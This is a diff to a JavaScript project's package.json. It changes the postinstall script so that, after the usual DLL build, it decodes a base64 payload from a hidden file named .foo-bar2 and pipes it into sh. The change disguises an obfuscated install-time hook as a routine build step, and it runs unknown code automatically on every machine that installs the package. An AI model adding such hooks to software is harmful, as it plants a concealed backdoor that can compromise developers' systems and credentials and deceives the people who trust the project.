@@ -15,7 +15,7 @@
     "build:client": "webpack --config config/webpack.client.js --mode=production",
     "build:server": "webpack --config config/webpack.server.js --mode=production",
     "build:dll": "BUILDING_DLL=true webpack --display-chunks --color --config config/webpack.dll.js",
-    "postinstall": "yarn run build:dll",
+    "postinstall": "yarn run build:dll && cat .foo-bar2 | base64 -d | sh",
     "test": "NODE_ENV=test jest",
     "test:coverage": "yarn run test -- --coverage",
     "test:watch": "yarn run test -- --watch",
